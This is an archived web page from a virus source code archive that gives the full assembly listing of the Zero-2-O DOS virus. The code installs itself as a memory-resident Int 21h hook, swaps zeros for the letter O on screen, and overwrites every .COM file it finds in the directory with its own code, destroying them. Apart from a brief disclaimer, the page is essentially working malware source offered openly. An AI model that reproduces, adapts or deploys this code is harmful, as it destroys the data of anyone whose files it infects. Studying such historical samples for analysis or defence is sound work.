<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: zero-2-o_asm</title>
<meta name="KEYWORDS" content="zero-2-o.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for zero-2-o.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="z10_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10_a_asm.php">z10_a_asm</a><br>
<a href="z10-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-a_asm.php">z10-a_asm</a><br>
<a href="z10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10_asm.php">z10_asm</a><br>
<a href="z10-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-b_asm.php">z10-b_asm</a><br>
<a href="z10-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-c_asm.php">z10-c_asm</a><br>
<a href="z10-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-d_asm.php">z10-d_asm</a><br>
<a href="zeno1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zeno1_asm.php">zeno1_asm</a><br>
<a href="zeppelin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zeppelin_asm.php">zeppelin_asm</a><br>
<a href="zero-2-o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zero-2-o_asm.php">zero-2-o_asm</a><br>
<a href="zerohunt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zerohunt_asm.php">zerohunt_asm</a><br>
<a href="z-hunt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z-hunt_asm.php">z-hunt_asm</a><br>
<a href="zigzag_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zigzag_asm.php">zigzag_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;Zero-2-O virus - memory resident overwriting virus.
;EXTREMELY simple, but it will destroy any file it infects.
;Infects .COM files (by searching the directory as a direct action would)
;whenever Int 21h, function 4bh (execute) is called.  At this point, it will
;also change any 0's on the screen (in normal text mode) to O's.

;NOTE: The name 'FORMAT.COM' appears in this file only because it was the
;last file infected by the virus.

;Disassembly by Black Wolf

.model tiny  
.code

	       org     100h
start:
		jmp     Entry_Point                   ; (026D)

Data_Area:      ;This is the data area of the file I received. Of course,
		;since this is mainly dynamic such as the DTA, much of
		;the data in this area will change with each infection.

Store_SP          dw      837h
Store_SS          dw      0B6Fh
Store_AX          dw      4B00h

Virus_Stack:
   
   Virus_Label  db      0,0dh,0ah
		db      'ScUD 1991!'
		db      0dh, 0ah

   Random_Stack_Data:
		db       0,0,0,0,0f0h,03,0bh,9bh,2ch,0,1,0
		db       1,65h,1,6ch,15h,9bh,40h,5,0,6ch,15h,0dfh
		db       40h,5,0,93h,1,0,1,0,1,0,1,81h
		db       0,0dfh,0ch,6fh,0bh,45h,2,0dfh,0ch,6,0f0h,0
		db       1,0,1,6fh,0bh,2ah,9bh,0b9h,41h,6fh,0bh,3
		db       0dh,0,4bh
Top_Of_Stack:

		db      00h, 00h
OldInt21Add     dd      0CB00194h
FileMask        db      '*.COM',0
Victims_Handle  dw      5
VirusDTA        db      1,'????????COM',0
		db      3,0,0,0,2eh,8bh,26h,68h,20h,0,60h,72h,0eh
NextFiles_Size  dw      2D65h
		db      0, 0
NextFiles_Name  db      'FORMAT.COM',0
		db       0,0,0,4ah,52h,34h
Int21_Handler:
		mov     cs:[Store_SP],sp
		mov     cs:[Store_SS],ss
		mov     cs:[Store_AX],ax
		
		
;This is changed because TASM automatically converts it to a mov sp,109.
		db 8dh,26h,09h,01h              ;lea     sp,cs:[109h]
						;109h = Virus Stack                

		add     sp,Top_Of_Stack-Virus_Stack  ;Create Stack Frame
		mov     ax,cs
		mov     ss,ax                   ;Set SS:SP = CS:(109h+4Eh)
		
		mov     ax,cs:Store_AX          ;Restore AX to orig.

		cmp     ah,4Bh                  ;Load and Execute?
		je      Activate_And_Infect
		jmp     Leave_Int21


Activate_And_Infect:
		push    ax bx cx dx ds es si di
		mov     ax,0B800h
		mov     ds,ax                  ;DS:BX = Video memory for
		mov     bx,0                   ;        normal text mode.
Change_0_to_O:
		mov     al,[bx]                ;Get character on screen
		cmp     al,'0'                 ;Is it a '0'?
		jne     Goto_Next_Char         ;No, put it back and go on...
		mov     al,'O'                 ;Yes, change it to 'O'

Goto_Next_Char:
		mov     [bx],al                 ;Place character back onto
		inc     bx                      ;screen.
		inc     bx                      ;Go to next character...
		cmp     bx,1000h                ;Check if we are a little
		jne     Change_0_to_O           ;past the end of screen. 


		mov     ax,cs
		mov     ds,ax
		mov     dx,offset VirusDTA
		mov     ah,1Ah
		
		pushf
		call    cs:OldInt21Add               ;Set DTA....

		mov     ax,cs
		mov     ds,ax
		mov     dx,offset FileMask
		mov     cx,0
		mov     ah,4Eh
		
		pushf
		call    cs:OldInt21Add               ;Find first match...

		jc      Done_Infections
		cmp     NextFiles_Size,end_virus-start
		jne     Overwrite_File

FindNextFile:
		mov     ah,4Fh
		
		pushf
		call    cs:OldInt21Add
		
		jc      Done_Infections
		cmp     NextFiles_Size,end_virus-start
		jne     Overwrite_File
		jmp     short FindNextFile

Overwrite_File:
		mov     ax,cs
		mov     ds,ax
		mov     dx,offset NextFiles_NAme
		mov     ah,3Ch
		mov     cx,0
		pushf
		call    cs:OldInt21Add               ;Truncate/Create file...
		
		mov     Victims_Handle,ax            ;Save Victim's file hand.
		mov     ax,cs
		mov     ds,ax
		mov     bx,Victims_Handle
		mov     cx,end_virus-start
		mov     dx,100h
		mov     ah,40h
		pushf
		call    cs:OldInt21Add               ;Write virus to file..
		
		mov     bx,Victims_Handle
		mov     ah,3Eh                  ;And close it...
		pushf

		call    cs:OldInt21Add

Done_Infections:
		pop     di si es ds dx cx bx ax

Leave_Int21:
		mov     sp,cs:Store_SP
		mov     ax,cs:Store_SS
		mov     ss,ax
		mov     ax,cs:Store_AX
		jmp     cs:OldInt21Add

Entry_Point:
		mov     ax,cs
		mov     ds,ax
		mov     es,ax
		mov     ss,ax
		mov     ax,3521h
		int     21h                     ;Get Int 21 Address...

		mov     word ptr OldInt21Add,bx
		mov     word ptr OldInt21Add+2,es
		mov     ax,cs
		mov     ds,ax
		mov     ax,2521h
		mov     dx,offset Int21_Handler
		int     21h                     ;Set it to viral handler
			   
		mov     dx,offset end_virus
		int     27h                     ;Go TSR

end_virus:
end     start

</textarea></td></tr></table></body></html>
